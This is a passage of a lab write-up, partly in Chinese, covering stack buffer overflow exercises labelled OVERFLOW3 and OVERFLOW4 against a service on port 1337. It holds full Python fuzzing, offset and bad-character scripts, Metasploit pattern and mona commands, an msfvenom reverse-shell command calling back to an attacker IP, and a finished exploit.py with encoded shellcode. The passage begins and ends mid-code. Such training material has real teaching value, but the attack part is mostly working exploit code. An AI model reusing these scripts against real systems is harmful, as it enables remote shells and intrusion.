\xe0\x18\xc4\xf8\xbe\x4f\x81\xcf\xb6\x05\x3f\x69\x61\x3b\xc2\xef\x4a\xff\x19\xcc\x55\xfe\xec\x68\x72\x10\x29\x70\x3e\x44\xe5\x27\xe8\x32\x43\x9e\x5a\xec\x1d\x4d\x35\x78\xdb\xbd\x86\xfe\xe4\xeb\x70\x1e\x54\x42\xc5\x21\x59\x02\xc1\x5a\x87\xb2\x2e\xb1\x03\xc2\x64\x9b\x22\x4b\x21\x4e\x77\x16\xd2\xa5\xb4\x2f\x51\x4f\x45\xd4\x49\x3a\x40\x90\xcd\xd7\x38\x89\xbb\xd7\xef\xaa\xe9\xd7\x0f\x55\x12&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="overflow3"><a class="markdownIt-Anchor" href="#overflow3"></a> OVERFLOW3</h2><h3 id="fuzz-3"><a class="markdownIt-Anchor" href="#fuzz-3"></a> FUZZ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># fuzz.py</span></span><br><span class="line"><span class="keyword">import</span> socket, time, sys</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line"></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">timeout = <span class="number">5</span></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW3 &quot;</span></span><br><span class="line"></span><br><span class="line">string = prefix + <span class="string">&quot;A&quot;</span> * <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">s.settimeout(timeout)</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">print(<span class="string">&quot;Fuzzing with &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">s.send(<span class="built_in">bytes</span>(string, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Fuzzing crashed at &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line">string += <span class="number">100</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fuzzing crashed at 1300 bytes</span><br></pre></td></tr></table></figure><h3 id="offset-3"><a class="markdownIt-Anchor" href="#offset-3"></a> OFFSET</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1300</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW3 &quot;</span></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">overflow = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2B&quot;</span></span><br><span class="line">retn = <span class="string">&quot;&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 35714234 -&gt; 5qB4 -&gt; 4Bq5</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 4Bq5 -l 1300</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Exact match at offset 1274</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW3 &quot;</span></span><br><span class="line">offset = <span class="number">1274</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 42424242 -&gt; BBBB</p><h3 id="badchar-3"><a class="markdownIt-Anchor" href="#badchar-3"></a> BADCHAR</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># charset.py</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">print(<span class="string">&quot;\\x&quot;</span> + <span class="string">&quot;&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(x), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW3 &quot;</span></span><br><span class="line">offset = <span class="number">1274</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.</p></blockquote><p>BADCHAR: <code>\x00\x11\x12\x40\x41\x5f\x60\xb8\xb9\xee\xef</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW3 &quot;</span></span><br><span class="line">offset = <span class="number">1274</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x10\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x3f\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5e\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb7\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xed\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>去掉BADCHAR<code>\x11\x40\x5f\xb8\xee</code>之后<code>\x12\x41\x60\xb9\xef</code>不受影响</p><p>BADCHAR: <code>\x00\x11\x40\x5f\xb8\xee</code></p><h3 id="jmp-esp-3"><a class="markdownIt-Anchor" href="#jmp-esp-3"></a> JMP ESP</h3><p>Immunity Debugger</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona jmp -r esp -cqb &quot;\x00\x11\x40\x5f\xb8\xee&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x625011af</span><br><span class="line">0x625011bb</span><br><span class="line">0x625011c7</span><br><span class="line">0x625011d3</span><br><span class="line">0x625011df</span><br><span class="line">0x625011eb</span><br><span class="line">0x625011f7</span><br><span class="line">0x62501203</span><br><span class="line">0x62501205</span><br></pre></td></tr></table></figure><h3 id="shellcode-3"><a class="markdownIt-Anchor" href="#shellcode-3"></a> SHELLCODE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.17.42.96 LPORT=1337 -b <span class="string">&quot;\x00\x11\x40\x5f\xb8\xee&quot;</span> -f c</span><br></pre></td></tr></table></figure><h3 id="exploit-3"><a class="markdownIt-Anchor" href="#exploit-3"></a> EXPLOIT</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW3 &quot;</span></span><br><span class="line">offset = <span class="number">1274</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;\x03\x12\x50\x62&quot;</span></span><br><span class="line">padding = <span class="string">&quot;\x90&quot;</span> * <span class="number">16</span></span><br><span class="line">payload = <span class="string">&quot;\xfc\xbb\x86\xb5\xc7\xaf\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x7a\x5d\x45\xaf\x82\x9e\x2a\x39\x67\xaf\x6a\x5d\xec\x80\x5a\x15\xa0\x2c\x10\x7b\x50\xa6\x54\x54\x57\x0f\xd2\x82\x56\x90\x4f\xf6\xf9\x12\x92\x2b\xd9\x2b\x5d\x3e\x18\x6b\x80\xb3\x48\x24\xce\x66\x7c\x41\x9a\xba\xf7\x19\x0a\xbb\xe4\xea\x2d\xea\xbb\x61\x74\x2c\x3a\xa5\x0c\x65\x24\xaa\x29\x3f\xdf\x18\xc5\xbe\x09\x51\x26\x6c\x74\x5d\xd5\x6c\xb1\x5a\x06\x1b\xcb\x98\xbb\x1c\x08\xe2\x67\xa8\x8a\x44\xe3\x0a\x76\x74\x20\xcc\xfd\x7a\x8d\x9a\x59\x9f\x10\x4e\xd2\x9b\x99\x71\x34\x2a\xd9\x55\x90\x76\xb9\xf4\x81\xd2\x6c\x08\xd1\xbc\xd1\xac\x9a\x51\x05\xdd\xc1\x3d\xea\xec\xf9\xbd\x64\x66\x8a\x8f\x2b\xdc\x04\xbc\xa4\xfa\xd3\xc3\x9e\xbb\x4b\x3a\x21\xbc\x42\xf9\x75\xec\xfc\x28\xf6\x67\xfc\xd5\x23\x27\xac\x79\x9c\x88\x1c\x3a\x4c\x61\x76\xb5\xb3\x91\x79\x1f\xdc\x38\x80\xc8\xe9\xad\xa0\x68\x86\xcf\xb4\x6d\x6f\x59\x52\x07\x9f\x0f\xcd\xb0\x06\x0a\x85\x21\xc6\x80\xe0\x62\x4c\x27\x15\x2c\xa5\x42\x05\xd9\x45\x19\x77\x4c\x59\xb7\x1f\x12\xc8\x5c\xdf\x5d\xf1\xca\x88\x0a\xc7\x02\x5c\xa7\x7e\xbd\x42\x3a\xe6\x86\xc6\xe1\xdb\x09\xc7\x64\x67\x2e\xd7\xb0\x68\x6a\x83\x6c\x3f\x24\x7d\xcb\xe9\x86\xd7\x85\x46\x41\xbf\x50\xa5\x52\xb9\x5c\xe0\x24\x25\xec\x5d\x71\x5a\xc1\x09\x75\x23\x3f\xaa\x7a\xfe\xfb\xda\x30\xa2\xaa\x72\x9d\x37\xef\x1e\x1e\xe2\x2c\x27\x9d\x06\xcd\xdc\xbd\x63\xc8\x99\x79\x98\xa0\xb2\xef\x9e\x17\xb2\x25\x9e\x97\x4c\xc6&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>BADCHAR也不能在EIP中出现</p><h2 id="overflow4"><a class="markdownIt-Anchor" href="#overflow4"></a> OVERFLOW4</h2><h3 id="fuzz-4"><a class="markdownIt-Anchor" href="#fuzz-4"></a> FUZZ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># fuzz.py</span></span><br><span class="line"><span class="keyword">import</span> socket, time, sys</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line"></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">timeout = <span class="number">5</span></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW4 &quot;</span></span><br><span class="line"></span><br><span class="line">string = prefix + <span class="string">&quot;A&quot;</span> * <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">s.settimeout(timeout)</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">print(<span class="string">&quot;Fuzzing with &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">s.send(<span class="built_in">bytes</span>(string, <span 